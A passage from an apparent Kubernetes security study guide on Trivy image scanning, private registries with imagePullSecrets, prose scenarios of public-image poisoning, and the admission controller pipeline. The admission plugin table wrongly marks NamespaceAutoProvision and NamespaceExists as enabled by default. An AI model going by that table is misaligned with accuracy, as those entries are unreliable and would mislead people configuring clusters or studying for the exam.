  │  │  Example: curl 7.74.0-1.3+deb11u2 < 7.74.0-1.3+deb11u7          │   │
  │  │  → VULNERABLE. Upgrade the curl package in your base image.       │   │
  │  └─────────────────────────────────────────────────────────────────┘   │
  └─────────────────────────────────────────────────────────────────────────┘

The Fix Workflow — From Scan to Remediation

1Scan

trivy image --severity CRITICAL,HIGH anihpj:v1 → 2 CRITICAL, 8 HIGH found.

2Triage

For each CVE: Is the package actually used? Is it network-exploitable? Is there a public exploit? Decide: fix now vs. fix later vs. ignore with justification.

3Fix

Update the base image in your Dockerfile: FROM python:3.12-slim@sha256:abc123... (pinning to digest ensures reproducibility). Or switch to a newer base: FROM python:3.13-slim.

4Rebuild

docker build -t anihpj:v2 . — the new base image has updated packages. The CVEs should be resolved.

5Rescan

trivy image anihpj:v2 — verify CRITICAL count dropped to 0, HIGH reduced significantly. Never assume a rebuild fixed everything.

6Deploy

Push v2 to registry. Update Kubernetes deployments to use the new image. Monitor for regressions.

🔄Repeat

Continuous scanning is not optional. Even after v2 is deployed, scan it weekly. New CVEs will be discovered. You need to know when your "secure" image becomes vulnerable again.

23.4 Private Container Registries — Controlling Image Sources

Even the most secure, Trivy-scanned, distroless-based image is useless if an attacker can trick your cluster into pulling a malicious image from a public registry. The principle: your cluster should ONLY pull images from registries you control. This section covers the mechanics of private registries: authentication, imagePullSecrets, and admission controller enforcement.

The Authentication Flow — How Kubernetes Pulls Private Images

Private Registry Authentication Flow — From Pod Creation to Image Pull
  ┌──────────────────────────────────────────────────────────────────────┐
  │  1. USER creates Pod with imagePullSecrets                           │
  │     ┌──────────────────────────────────────────────────────────┐    │
  │     │  spec:                                                    │    │
  │     │    imagePullSecrets:                                      │    │
  │     │    - name: ecr-credentials    ← references a Secret       │    │
  │     │    containers:                                            │    │
  │     │    - image: 12345.dkr.ecr.us-east-1.amazonaws.com/anihpj │    │
  │     └──────────────────────────────────────────────────────────┘    │
  │                         │                                             │
  │                         ▼                                             │
  │  2. KUBELET reads imagePullSecrets                                    │
  │     ┌──────────────────────────────────────────────────────────┐    │
  │     │  kubelet looks up Secret "ecr-credentials" in the pod's  │    │
  │     │  namespace. Secret contains:                              │    │
  │     │    .dockerconfigjson: base64({                            │    │
  │     │      "auths": {                                          │    │
  │     │        "12345.dkr.ecr.us-east-1.amazonaws.com": {        │    │
  │     │          "username": "AWS",                              │    │
  │     │          "password": "eyJ......"         │    │
  │     │        }                                                 │    │
  │     │      }                                                   │    │
  │     │    })                                                    │    │
  │     └──────────────────────────────────────────────────────────┘    │
  │                         │                                             │
  │                         ▼                                             │
  │  3. KUBELET authenticates to registry                                 │
  │     ┌──────────────────────────────────────────────────────────┐    │
  │     │  kubelet → HTTPS → registry endpoint                      │    │
  │     │  Authorization: Basic base64(AWS:eyJ...)                  │    │
  │     │  GET /v2/anihpj/manifests/v2.0.0                         │    │
  │     │  ← 200 OK (authenticated)                                 │    │
  │     └──────────────────────────────────────────────────────────┘    │
  │                         │                                             │
  │                         ▼                                             │
  │  4. KUBELET pulls image layers                                        │
  │     ┌──────────────────────────────────────────────────────────┐    │
  │     │  kubelet downloads image layers from registry             │    │
  │     │  Stores in local container runtime cache                  │    │
  │     │  Starts container from the cached image                   │    │
  │     └──────────────────────────────────────────────────────────┘    │
  │                                                                       │
  │  ⚠️  SECURITY NOTE: ECR tokens EXPIRE (typically 12 hours).          │
  │     You need a mechanism to refresh imagePullSecrets regularly.       │
  │     Solutions: kubelet ECR credential provider, Kyverno, or a CronJob.│
  └──────────────────────────────────────────────────────────────────────┘

Creating and Using imagePullSecrets

Bash + YAML — Creating registry credentials and using them in a Pod 
# ── Create the imagePullSecret ──
# Option A: From existing Docker credentials
kubectl create secret generic ecr-credentials \
  --from-file=.dockerconfigjson=$HOME/.docker/config.json \
  --type=kubernetes.io/dockerconfigjson \
  -n anihpj

# Option B: Directly provide credentials
kubectl create secret docker-registry ecr-credentials \
  --docker-server=12345.dkr.ecr.us-east-1.amazonaws.com \
  --docker-username=AWS \
  --docker-password=$(aws ecr get-login-password) \
  --docker-email=ops@anihpj.com \
  -n anihpj

# ── Verify the secret ──
kubectl get secret ecr-credentials -n anihpj -o jsonpath='{.data}' | jq .

# ── Patch default ServiceAccount to use the secret automatically ──
# Every pod in the namespace will use this secret without explicit reference
kubectl patch serviceaccount default -n anihpj -p \
  '{"imagePullSecrets": [{"name": "ecr-credentials"}]}'
YAML — Pod explicitly referencing imagePullSecrets 
apiVersion: v1
kind: Pod
metadata:
  name: anihpj-django
  namespace: anihpj
spec:
  # ⬅⬅⬅ imagePullSecrets: Credentials for private registry
  imagePullSecrets:
  - name: ecr-credentials
  containers:
  - name: anihpj
    # ⬅⬅⬅ Image MUST come from our private registry — NOT Docker Hub
    image: 12345.dkr.ecr.us-east-1.amazonaws.com/anihpj-django:v2.0.0
    ports:
    - containerPort: 8000

🔴 ATTACK SCENARIO: Public Image Poisoning — When Docker Hub Images Are Not What They Seem

ATTACK SCENARIO How Attackers Exploit Public Registries to Inject Malicious Images
1
Typo-Squatting

Your team uses image: anihpj/django-app:v2 in a Deployment. A developer accidentally types image: anihpj/djano-app:v2 (missing the 'g'). An attacker has already published anihpj/djano-app:v2 on Docker Hub — it looks identical to your app but contains a cryptominer binary that starts alongside gunicorn. The pod deploys. The cryptominer runs. Your cloud bill spikes. You never noticed because the app still works.

2
Tag Mutability

You deploy image: python:3.12-slim (using the floating tag). Today, python:3.12-slim points to a clean, official image. Tomorrow, a compromised Docker Hub account pushes a new image tagged python:3.12-slim that contains a backdoor. Your new pods pull the malicious image. The tag didn't change — the image it points to did.

3
Abandoned Namespace Takeover

You use a utility image from Docker Hub: image: some-user/k8s-sidecar:v1.2. The original author deletes their Docker Hub account. An attacker re-registers the username and pushes a new some-user/k8s-sidecar:v1.2 with malware. Your cluster pulls it. The attacker now runs code in your cluster.

🛡️
Defense: Private Registry + Digest Pinning

(1) Always use a private registry — proxy or cache all external images through a registry you control. Never pull directly from Docker Hub in production. (2) Pin to image digests, not tags: image: registry.anihpj.com/anihpj@sha256:abc123... — digests are immutable; tags are mutable. (3) Admission controller enforcement: use OPA/Gatekeeper or Kyverno to reject any pod that references an unapproved registry. (4) Regularly audit running images against approved registries.

Decision Tree: Private Registry Strategy for Your Organization

Choosing a Container Registry Architecture
  START: I need to control which images run in my cluster
  │
  ├─ Am I on a public cloud? (AWS, GCP, Azure)
  │  ├─ AWS → ECR (Elastic Container Registry)
  │  │  • IAM-based auth (no passwords to manage)
  │  │  • Image scanning built-in (ECR Scan / Inspector)
  │  │  • Immutable tags supported
  │  │  • Tip: Use ECR pull-through cache to proxy Docker Hub
  │  ├─ GCP → Artifact Registry
  │  │  • IAM-based auth
  │  │  • Vulnerability scanning built-in
  │  │  • Native integration with GKE
  │  └─ Azure → Azure Container Registry (ACR)
  │     • Azure AD auth
  │     • Defender for Containers scanning
  │     • Native integration with AKS
  │
  ├─ Am I self-hosted / on-prem?
  │  ├─ Harbor (CNCF graduated, full-featured)
  │  │  • Vulnerability scanning (Trivy built-in)
  │  │  • Image signing (Notary/Cosign)
  │  │  • RBAC, replication, garbage collection
  │  │  • Project-based image organization
  │  └─ Docker Registry (simpler, fewer features)
  │     • Basic pull/push only
  │     • No scanning, no signing
  │     • Good for dev environments only
  │
  └─ Do I need to proxy Docker Hub / public registries?
     └─ YES → Set up PULL-THROUGH CACHE
        • ECR Pull-Through Cache
        • Harbor Proxy Cache
        • Benefits: All images go through YOUR registry
        • You control vulnerability scanning on proxied images
        • You can block specific public images at the proxy level

📊 Chapter 23 Visual Summary — Image Security at a Glance

⚠️
The Risk (23.1)

Average image: 100+ CVEs. Images are immutable snapshots that rot over time. A clean image today may have 23 CVEs in 6 months — without you changing a single line of code.

Key: Understand the CVE lifecycle and CVSS scoring.

📦
Minimize (23.2)

Distroless: 20MB, no shell, no pkg mgr. Multi-stage builds separate build from runtime. Every removed package = attack vector eliminated forever.

Key: Migrate from full images → distroless in 6 steps.

🔍
Trivy (23.3)

Scan in CI/CD. Fail on CRITICAL. Detects OS + language CVEs. Database must be updated before every scan. Output: table, JSON, SARIF.

Key: trivy image --severity CRITICAL --exit-code 1 <image>

🔐
Registries (23.4)

Private registry + digest pinning. Never pull from Docker Hub in production. Use admission controllers to enforce approved registries only.

Key: imagePullSecrets + registry allowlist.

💡 Key Takeaway for the CKS Exam

The CKS exam may ask you to scan an image with Trivy and interpret the output. Know: (1) trivy image <image> to scan, (2) --severity CRITICAL,HIGH to filter, (3) --exit-code 1 to fail CI/CD on findings. Understand that scanning finds KNOWN vulnerabilities — it does not protect against zero-days or intentionally malicious images (that's what image signing in Ch26 is for). The exam also expects you to know that imagePullSecrets are namespace-scoped and must be in the SAME namespace as the pod. If you see a ErrImagePull or ImagePullBackOff error, check: (a) does the secret exist in the pod's namespace? (b) does the secret have the correct registry credentials? (c) has the ECR/ACR/GCR token expired?

Chapter 24: Admission Controllers & Image Policy Webhook

Authentication answers "Who are you?" Authorization answers "Are you allowed to do this?" But there's a critical third question neither answers: "Should this specific request be allowed, even if the user has permission?" That's the domain of Admission Controllers — the final gatekeeper in the Kubernetes API request pipeline. Admission controllers can mutate (modify) incoming objects before they're stored, or validate (accept/reject) them based on policies you define. They are your last line of defense against misconfigured pods, images from untrusted registries, privilege escalations, and countless other security risks that RBAC alone cannot prevent. If you're not using admission control, you're leaving the API server's back door wide open.

🟡 Intermediate ⏱️ ~2 hours 🚪 Admission Control 📦 Supply Chain

🎯 What You'll Learn — Core-Level Mastery

  • ✅ The admission pipeline internals: How plugins are registered, ordered, and executed in the API server's handler chain — not just what happens, but WHY in that exact order
  • ✅ Every built-in admission plugin: NodeRestriction, PodSecurity, LimitRanger, ResourceQuota, ServiceAccount, and 25+ more — categorized by function with CKS exam scenarios
  • ✅ Webhook mechanics: TLS certificate lifecycle, AdmissionReview protocol, objectSelector, reinvocationPolicy, timeout/retry behavior, and debugging strategies
  • ✅ Rego language fundamentals: Logic programming paradigm, rules vs functions, iteration patterns, comprehensions — understand Rego at the language level, not just copy-paste
  • ✅ Kyverno end-to-end: Validate, Mutate, Generate, VerifyImages — with CLI testing, policy reports, and controller auto-gen patterns
  • ✅ Production patterns: How to run OPA and Kyverno together, migration strategies, performance tuning, and monitoring admission controller health
🎓 CKS Relevance
Supply Chain Security 20% Cluster Hardening 15%

24.1 What Are Admission Controllers? — The API Server's Final Gate

Every request to the Kubernetes API server follows a strict pipeline. Authentication verifies your identity (certificate, token, OIDC). Authorization checks your RBAC permissions (can you create pods in this namespace?). But even after both pass, the API server runs admission controllers — plugins that intercept the request, inspect the object, and can modify it (mutating admission) or reject it (validating admission) before the object is ever written to etcd. This is your last chance to enforce organizational policies that RBAC cannot express: "All pods must have resource limits," "Images must come from approved registries," "No containers may run as root."

How Admission Plugins Work — The Internal Plugin Chain Architecture

Under the hood, the Kubernetes API server implements admission as a chain of responsibility pattern. Each plugin is a Go interface implementation registered at API server startup. The chain is NOT dynamic — it's built once at server initialization based on the --enable-admission-plugins and --disable-admission-plugins flags. During request processing, the API server's handler iterates through this chain sequentially:

Admission Plugin Chain — Internal Architecture (Go-level view)
  API SERVER STARTUP:
  ─────────────────────────────────────────────────────────────────
  kube-apiserver binary starts → parses flags → builds plugin chain

  --enable-admission-plugins=NamespaceLifecycle,ServiceAccount,MutatingAdmissionWebhook,
                              PodSecurity,NodeRestriction,ValidatingAdmissionWebhook

  ┌──────────────────────────────────────────────────────────────────────┐
  │  Plugin Registry (map[string]Interface) — ~30 registered plugins     │
  │                                                                       │
  │  The API server maintains a registry of ALL built-in plugins.        │
  │  Each plugin implements one or both interfaces:                      │
  │                                                                       │
  │  type MutatingAdmission interface {                                  │
  │      Admit(ctx, attrs) error       ← Can modify the object           │
  │  }                                                                    │
  │                                                                       │
  │  type ValidatingAdmission interface {                                │
  │      Validate(ctx, attrs) error    ← Can only accept or reject       │
  │  }                                                                    │
  │                                                                       │
  │  At startup, the API server:                                          │
  │  1. Reads --enable-admission-plugins (the ordered list)              │
  │  2. Looks up each name in the registry                               │
  │  3. Calls plugin.ValidateInitialConfiguration() for each             │
  │  4. Builds two ordered lists: mutatingAdmissionChain,                │
  │     validatingAdmissionChain                                          │
  │  5. If a plugin is NOT in --enable-admission-plugins but IS in       │
  │     DEFAULT plugins → it is still enabled (defaults are additive)    │
  │  6. If a plugin is in --disable-admission-plugins → removed          │
  └──────────────────────────────────────────────────────────────────────┘

  REQUEST PROCESSING (per-request):
  ─────────────────────────────────
  Request arrives → handler serves it:
  1. Decode request body
  2. AuthN (authenticate)
  3. AuthZ (authorize)
  4. FOR EACH plugin IN mutatingAdmissionChain (ordered):
       plugin.Admit(ctx, attrs)
       If plugin modifies object → replace object with modified version
       If plugin returns error → 500 Internal Server Error → STOP
  5. Schema validation (OpenAPI)
  6. FOR EACH plugin IN validatingAdmissionChain (ordered):
       plugin.Validate(ctx, attrs)
       If plugin returns deny → 403 Forbidden → STOP
  7. etcd write

  🔑 WHY ORDER MATTERS:
  ─────────────────────
  Mutating plugins run FIRST because validators need to see the FINAL object.
  If you put a validating plugin BEFORE a mutating plugin in the chain,
  the validator would check the ORIGINAL (not-yet-mutated) object.
  The ordering within each phase also matters: NamespaceLifecycle must
  run before ServiceAccount, because SAs depend on namespace existence.

The Complete API Request Pipeline — Where Admission Fits

Kubernetes API Request Lifecycle — AuthN → AuthZ → Admission → Etcd
  kubectl apply -f anihpj-pod.yaml
  │
  ▼
  ┌────────────────────────────────────────────────────────────────────────────┐
  │  1. AUTHENTICATION (AuthN) — "WHO are you?"                                │
  │  ┌──────────────────────────────────────────────────────────────────────┐  │
  │  │  • Client certificate validated against CA                           │  │
  │  │  • Bearer token validated (ServiceAccount JWT, OIDC, Webhook)       │  │
  │  │  • If AuthN FAILS → 401 Unauthorized → STOP. Request ends here.     │  │
  │  │  • Result: username="system:serviceaccount:anihpj:deployer"         │  │
  │  │           groups=["system:serviceaccounts", "system:authenticated"] │  │
  │  └──────────────────────────────────────────────────────────────────────┘  │
  │       │ ✅ Authenticated                                                   │
  │       ▼                                                                     │
  │  2. AUTHORIZATION (AuthZ) — "ARE you allowed?"                              │
  │  ┌──────────────────────────────────────────────────────────────────────┐  │
  │  │  • RBAC: Does this user/group/SA have a RoleBinding allowing         │  │
  │  │    "create pods" in namespace "anihpj"?                              │  │
  │  │  • Node Authorizer: Is this kubelet requesting only its own pods?    │  │
  │  │  • Webhook: Call external authorizer (custom logic)                  │  │
  │  │  • If AuthZ FAILS → 403 Forbidden → STOP. Request ends here.        │  │
  │  │  • Result: ALLOWED (user has "create pods" via ClusterRole)          │  │
  │  └──────────────────────────────────────────────────────────────────────┘  │
  │       │ ✅ Authorized                                                       │
  │       ▼                                                                     │
  │  3. MUTATING ADMISSION — "MODIFY the object BEFORE validation"              │
  │  ┌──────────────────────────────────────────────────────────────────────┐  │
  │  │  Runs FIRST, in sequence. Each plugin sees the output of the previous │  │
  │  │  one. Plugins can ADD, CHANGE, or REMOVE fields from the object.     │  │
  │  │                                                                       │  │
  │  │  Examples:                                                            │  │
  │  │  • ServiceAccount plugin → adds default ServiceAccount if missing    │  │
  │  │  • LimitRanger → sets default CPU/memory limits if not specified     │  │
  │  │  • Kyverno mutate → adds securityContext if the developer forgot it   │  │
  │  │  • MutatingAdmissionWebhook → calls external mutating webhook         │  │
  │  └──────────────────────────────────────────────────────────────────────┘  │
  │       │ Object may have been modified                                      │
  │       ▼                                                                     │
  │  4. OBJECT SCHEMA VALIDATION — "Is the object structurally valid?"          │
  │  ┌──────────────────────────────────────────────────────────────────────┐  │
  │  │  • Does the YAML match the OpenAPI schema for this resource type?    │  │
  │  │  • Are required fields present? Are field types correct?             │  │
  │  │  • If FAIL → 400 Bad Request → STOP.                                 │  │
  │  └──────────────────────────────────────────────────────────────────────┘  │
  │       │ ✅ Structurally valid                                               │
  │       ▼                                                                     │
  │  5. VALIDATING ADMISSION — "ACCEPT or REJECT the final object"              │
  │  ┌──────────────────────────────────────────────────────────────────────┐  │
  │  │  Runs SECOND, after all mutations. Plugins see the FINAL object.     │  │
  │  │  Plugins can ONLY allow or deny — they CANNOT modify.                │  │
  │  │                                                                       │  │
  │  │  Examples:                                                            │  │
  │  │  • PodSecurity → enforces Pod Security Standards (baseline/restricted)│  │
  │  │  • NodeRestriction → kubelet can only modify its OWN node's pods     │  │
  │  │  • ResourceQuota → namespace has enough CPU/memory remaining?        │  │
  │  │  • OPA Gatekeeper → image from approved registry?                    │  │
  │  │  • Kyverno validate → runAsNonRoot: true enforced?                   │  │
  │  │  • If ANY validating plugin returns DENY → 403 Forbidden → STOP     │  │
  │  └──────────────────────────────────────────────────────────────────────┘  │
  │       │ ✅ All validating plugins passed                                    │
  │       ▼                                                                     │
  │  6. PERSIST TO etcd — "Object is now stored and available"                  │
  │  ┌──────────────────────────────────────────────────────────────────────┐  │
  │  │  • Object serialized and written to etcd                             │  │
  │  │  • Controllers watch for new objects and reconcile                   │  │
  │  │  • Scheduler assigns pod to node, kubelet starts containers          │  │
  │  └──────────────────────────────────────────────────────────────────────┘  │
  └────────────────────────────────────────────────────────────────────────────┘

  🔑 THE KEY INSIGHT:
  ─────────────────────
  RBAC controls WHO can do WHAT. Admission controllers control HOW it's done.
  RBAC says: "Alice can create pods." → Admission says: "But NOT with
  hostNetwork: true and NOT with an image from docker.io."

Complete Built-in Admission Plugin Catalog — All ~30 Plugins by Category

The API server ships with approximately 30 admission plugins. Understanding which ones are enabled by default and which are security-critical is essential for the CKS exam:

CategoryPluginTypeDefault?Purpose
🔴 SecurityNodeRestrictionValidating✅Limits kubelet to own node's pods/secrets
PodSecurityValidating✅Enforces PSS (privileged/baseline/restricted)
ImagePolicyWebhookValidating❌External image approval webhook
CertificateApprovalValidating❌Approves CSR signing requests
CertificateSigningMutating❌Sets default CSR signer
CertificateSubjectRestrictionValidating❌Restricts CSR subject fields
🟢 Resource MgmtLimitRangerMut+Val✅Default + min/max resource limits
ResourceQuotaValidating✅Enforces namespace resource caps
PriorityValidating❌Resolves PriorityClass
DefaultIngressClassMutating❌Sets default IngressClass
PersistentVolumeLabelMutating❌Adds region/zone PV labels (deprecated)
🟡 LifecycleNamespaceLifecycleValidating✅Blocks creation in terminating namespaces
NamespaceExistsValidating✅Rejects requests to nonexistent namespaces
NamespaceAutoProvisionMutating✅Auto-creates namespace if missing (deprecated)
StorageObjectInUseProtectionMutating✅Adds deletion protection finalizer to PV/PVC
🔵 Service/IdentityServiceAccountMutating✅Auto-assigns default SA and mounts token
DenyServiceExternalIPsValidating❌Blocks Services with externalIPs

RuntimeClassValidating❌Controls RuntimeClass usage
